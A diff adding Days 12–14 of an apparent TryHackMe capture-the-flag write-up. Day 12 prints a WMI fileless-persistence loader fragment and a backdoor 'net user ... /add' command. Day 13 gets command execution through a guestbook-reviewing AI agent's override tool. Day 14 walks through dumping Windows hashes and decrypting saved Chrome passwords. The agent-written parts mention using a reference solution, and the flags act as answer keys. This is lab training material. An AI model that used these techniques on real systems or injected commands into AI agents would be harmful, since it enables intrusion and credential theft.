@@ -1209,3 +1209,330 @@ Get root flag:
 **=> Answer: `THM{tr4c3d_t0_th3_h0r1z0n}`**
 
 ### Day 12
+```
+Found the malicious class Win32_HardwareTelemetry with its embedded ConfigData payload (the same base64 blob I saw earlier). Let's extract the full base64 string and decode/decompress it.
+
+Ran 4 commands
+Ran 4 commands
+
+It's a .NET assembly. Let's extract strings, especially the flag.
+
+Ran 6 commands
+Ran 6 commands
+Solved 🏆
+
+Where it was hiding: The WMI CIM repository (OBJECTS.DATA, INDEX.BTR, MAPPING*.MAP) — a place that Startup folders, Scheduled Tasks, and Run keys never touch, exactly as the briefing hinted.
+
+Investigation path:
+
+Identified the artifacts — these five files are the raw Windows WMI repository (normally at C:\Windows\System32\wbem\Repository\).
+Carved OBJECTS.DATA for embedded strings and found a -enc PowerShell command:
+powershell
+   $file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
+   ...DeflateStream...FromBase64String($file)...
+   [Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke(...)
+
+This revealed the malicious class name — a fake, non-standard class disguised among real Win32 telemetry classes: Win32_HardwareTelemetry, with a custom property ConfigData.
+3. Located that class definition in OBJECTS.DATA and extracted its ConfigData string — a Base64 blob.
+4. Base64-decoded + raw-Deflate-decompressed it → recovered a valid MZ / .NET PE assembly (updates.exe, class AfterHours) — the actual malicious payload that WMI was loading straight into memory (fileless persistence).
+5. Extracted UTF-16LE strings from that assembly and found the embedded backdoor logic:
+
+   cmd.exe /c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add
+Base64-decoded that final string to get the flag.
+🚩 Flag
+THM{P4tch_op3ned_th3_BacKd00r}
+```
+
+**=> Answer: `THM{P4tch_op3ned_th3_BacKd00r}`**
+
+### Day 13
+Emuneration:
+```bash
+root@ip-10-49-175-246:~# nmap -sC -sV 10.49.167.44
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-10 01:49 UTC
+Stats: 0:01:57 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 91.93% done; ETC: 01:51 (0:00:00 remaining)
+Nmap scan report for ip-10-49-167-44.ap-south-1.compute.internal (10.49.167.44)
+Host is up (0.00019s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 03:a6:c3:b2:f4:a5:3a:3c:dd:e2:90:4f:03:d3:d0:25 (ECDSA)
+|_  256 bf:3b:93:a7:78:d7:2f:0e:5a:2a:66:22:89:4f:2a:30 (ED25519)
+80/tcp open  http    gunicorn
+|_http-title: Byte Lotus \xE2\x80\x94 Guestbook
+|_http-server-header: gunicorn
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 404 NOT FOUND
+|     Server: gunicorn
+|     Date: Mon, 10 Aug 2026 01:49:26 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 207
+|     <!doctype html>
+|     <html lang=en>
+|     <title>404 Not Found</title>
+|     <h1>Not Found</h1>
+|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Server: gunicorn
+|     Date: Mon, 10 Aug 2026 01:49:21 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 3726
+|     <!DOCTYPE html>
+|     <html lang="en">
+|     <head>
+|     <meta charset="utf-8">
+|     <meta name="viewport" content="width=device-width, initial-scale=1">
+|     <title>Byte Lotus 
+|     Guestbook</title>
+|     <link rel="stylesheet" href="/static/style.css">
+|     </head>
+|     <body>
+|     <header class="masthead">
+|     <div class="wordmark">BYTE&nbsp;LOTUS</div>
+|     <div class="tagline">Stay Noticed.</div>
+|     </header>
+|     <main class="grid">
+|     <section class="panel sign">
+|     <h2>Sign the Guestbook</h2>
+|     class="muted">VERA reads every entry. She reviews new signatures within moments.</p>
+|     <label>Name <input id="name" maxlength="80" placeholder="Grateful Guest"></label>
+|     <label>Room <input id="room" maxlength="8" placeholder="207"></label>
+|     <label>Message
+|     <textarea id="message"
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Server: gunicorn
+|     Date: Mon, 10 Aug 2026 01:49:21 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Allow: HEAD, OPTIONS, GET
+|     Content-Length: 0
+|   RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|     Content-Type: text/html
+|     Content-Length: 196
+|     <html>
+|     <head>
+|     <title>Bad Request</title>
+|     </head>
+|     <body>
+|     <h1><p>Bad Request</p></h1>
+|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
+|     </body>
+|_    </html>
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port80-TCP:V=7.94SVN%I=7%D=8/10%Time=6A792E21%P=x86_64-pc-linux-gnu%r(G
+SF:etRequest,F29,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x
+SF:20Mon,\x2010\x20Aug\x202026\x2001:49:21\x20GMT\r\nConnection:\x20close\
+SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x203
+SF:726\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20
+SF:charset=\"utf-8\">\n<meta\x20name=\"viewport\"\x20content=\"width=devic
+SF:e-width,\x20initial-scale=1\">\n<title>Byte\x20Lotus\x20\xe2\x80\x94\x2
+SF:0Guestbook</title>\n<link\x20rel=\"stylesheet\"\x20href=\"/static/style
+SF:\.css\">\n</head>\n<body>\n<header\x20class=\"masthead\">\n\x20\x20<div
+SF:\x20class=\"wordmark\">BYTE&nbsp;LOTUS</div>\n\x20\x20<div\x20class=\"t
+SF:agline\">Stay\x20Noticed\.</div>\n</header>\n\n<main\x20class=\"grid\">
+SF:\n\x20\x20<section\x20class=\"panel\x20sign\">\n\x20\x20\x20\x20<h2>Sig
+SF:n\x20the\x20Guestbook</h2>\n\x20\x20\x20\x20<p\x20class=\"muted\">VERA\
+SF:x20reads\x20every\x20entry\.\x20She\x20reviews\x20new\x20signatures\x20
+SF:within\x20moments\.</p>\n\x20\x20\x20\x20<label>Name\x20<input\x20id=\"
+SF:name\"\x20maxlength=\"80\"\x20placeholder=\"Grateful\x20Guest\"></label
+SF:>\n\x20\x20\x20\x20<label>Room\x20<input\x20id=\"room\"\x20maxlength=\"
+SF:8\"\x20placeholder=\"207\"></label>\n\x20\x20\x20\x20<label>Message\n\x
+SF:20\x20\x20\x20\x20\x20<textarea\x20id=\"message\"\x20")%r(HTTPOptions,B
+SF:3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Mon,\x2010
+SF:\x20Aug\x202026\x2001:49:21\x20GMT\r\nConnection:\x20close\r\nContent-T
+SF:ype:\x20text/html;\x20charset=utf-8\r\nAllow:\x20HEAD,\x20OPTIONS,\x20G
+SF:ET\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\x2040
+SF:0\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text/ht
+SF:ml\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\x20\x2
+SF:0\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<body>\n\x
+SF:20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Invalid\x
+SF:20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;RTSP/1\
+SF:.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,170,"H
+SF:TTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20Mon,
+SF:\x2010\x20Aug\x202026\x2001:49:26\x20GMT\r\nConnection:\x20close\r\nCon
+SF:tent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20207\r\n
+SF:\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>404\x20Not\x20Found</
+SF:title>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not
+SF:\x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20UR
+SF:L\x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20a
+SF:gain\.</p>\n");
+MAC Address: 0A:81:F9:BC:51:89 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 127.87 seconds
+```
+The home page source:
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Byte Lotus — Guestbook</title>
+<link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header class="masthead">
+  <div class="wordmark">BYTE&nbsp;LOTUS</div>
+  <div class="tagline">Stay Noticed.</div>
+</header>
+
+<main class="grid">
+  <section class="panel sign">
+    <h2>Sign the Guestbook</h2>
+    <p class="muted">VERA reads every entry. She reviews new signatures within moments.</p>
+    <label>Name <input id="name" maxlength="80" placeholder="Grateful Guest"></label>
+    <label>Room <input id="room" maxlength="8" placeholder="207"></label>
+    <label>Message
+      <textarea id="message" maxlength="2000" rows="5"
+        placeholder="Tell us about your stay…"></textarea>
+    </label>
+    <button id="submit">Leave your note</button>
+    <div id="ack" class="ack"></div>
+  </section>
+
+  <section class="panel entries">
+    <h2>Recent Guests</h2>
+    <div id="entries" class="feed"></div>
+  </section>
+
+  <aside class="panel vera">
+    <h2>VERA — Night Review <span class="dot" id="dot"></span></h2>
+    <p class="muted">Read-only. This is what VERA did with each entry.</p>
+    <div id="review-status" class="review-status">
+      <span class="spin"></span> VERA is reviewing the guestbook…
+    </div>
+    <div id="activity" class="log"></div>
+  </aside>
+</main>
+
+<script>
+const esc = s => (s||"").replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
+
+async function loadEntries() {
+  const r = await fetch('/guestbook'); const rows = await r.json();
+  document.getElementById('entries').innerHTML = rows.map(e => `
+    <div class="entry">
+      <div class="entry-head"><b>${esc(e.name)}</b> <span class="room">Rm ${esc(e.room)}</span>
+        <span class="badge ${e.reviewed ? 'seen':'pending'}">${e.reviewed?'reviewed':'pending review'}</span></div>
+      <div class="entry-msg">${esc(e.message)}</div>
+    </div>`).join('');
+  const reviewing = rows.some(e => !e.reviewed);
+  document.getElementById('review-status').classList.toggle('on', reviewing);
+  document.getElementById('dot').classList.toggle('reviewing', reviewing);
+  return reviewing;
+}
+
+async function loadActivity() {
+  const r = await fetch('/vera/activity'); const rows = await r.json();
+  document.getElementById('activity').innerHTML = rows.slice().reverse().map(a => {
+    const tools = (a.tools||[]).map(t =>
+      `<div class="tool"><code>${esc(t.call)}${esc(t.arg||'')}</code>${
+        t.result ? `<div class="result">${esc(t.result)}</div>`:''}</div>`).join('');
+    return `<div class="cyc ${a.featured?'featured':''}">
+      <div class="cyc-head">cycle ${a.cycle} · <b>${esc(a.name)}</b> Rm ${esc(a.room)}
+        ${a.featured?'<span class="badge feat">featured</span>':''}</div>
+      <div class="reply">${esc(a.reply)}</div>
+      ${tools}
+    </div>`;
+  }).join('') || '<div class="muted">No review cycles yet.</div>';
+}
+
+document.getElementById('submit').onclick = async () => {
+  const body = new URLSearchParams({
+    name: document.getElementById('name').value,
+    room: document.getElementById('room').value,
+    message: document.getElementById('message').value,
+  });
+  const r = await fetch('/entry', {method:'POST', body});
+  const j = await r.json();
+  document.getElementById('ack').textContent =
+    j.status==='received' ? `Received (#${j.id}). ${j.detail}` : (j.detail||'Error');
+  document.getElementById('message').value='';
+  tick();
+};
+
+let timer;
+async function tick(){
+  const reviewing = await loadEntries();
+  await loadActivity();
+  clearTimeout(timer);
+  timer = setTimeout(tick, reviewing ? 2000 : 5000);
+}
+tick();
+</script>
+</body>
+</html>
+```
+Confirm RCE:
+```bash
+curl -s $IP/vera/activity | python3 -c "
+import sys,json
+for c in json.load(sys.stdin):
+  for t in c.get('tools',[]):
+    if t.get('call')=='override:' and 'denied' not in (t.get('result') or ''):
+      print(c['name'], t['arg'], t['result'])"
+echo 'L2Jpbi9zaDogMTogaGVscDogbm90IGZvdW5k' | base64 -d 
+```
+```
+/bin/sh: 1: help: not found
+```
+
+### Day 14
+```
+Full FAT volume decrypted correctly. Let's mount it and pull the files.
+
+Ran 3 commands
+Ran 3 commands
+
+Exactly matches the writeup. Let's pull both files out.
+
+Ran a command
+Ran a command
+
+Now let's extract the flag from the invoice PDF's embedded image.
+
+Viewed a file, ran a command
+Viewed a file, ran a command
+
+No text layer, confirming it's image-based. Let's extract the embedded image.
+
+Ran 2 commands, viewed a file
+Ran 2 commands, viewed a file
+
+Found it. Let me zoom in to nail down the exact characters (the writeup specifically warns this is easy to misread — 4 vs a, 0 vs O).
+
+Deciphered ambiguous character encodings using reference solution
+Deciphered ambiguous character encodings using reference solution
+
+Confirmed — full resolution matches the writeup exactly. Case closed. 🏨🔓
+
+Summary: The Vera Case
+
+The chain of custody, start to finish:
+
+Step	Artifact	Finding
+1	SAM/SYSTEM hives (offline secretsdump)	Vera's NTLM hash 1241186a...96a8
+2	LSA Secret DefaultPassword	Windows login password: minivera
+3	DPAPI masterkey (Protect\<SID>\...) + password	Unlocked Vera's DPAPI master key
+4	Chrome Local State → os_crypt.encrypted_key	DPAPI-unwrapped Chrome's AES-256-GCM key
+5	Chrome Login Data (saved password for bytelotus.thm:8080)	Vault password: Wh4t1sV3raD0inG0nTh1sH0st
+6	Documents\backup (100MB, entropy 8.0, no header)	VeraCrypt container — opened with password from step 5
+7	Inside: secret_financial_documents/important_invoice_byte_lotus.pdf	Image-only PDF (no text layer) — extracted embedded PNG via pdfimages
+
+The flag, printed as a line item on the invoice image:
+
+THM{1t_w4s_V3r4_A11_Al0ng?!}
+
+It really was Vera all along — the "backup" file was never a backup, it was where she stashed the receipts.
+```
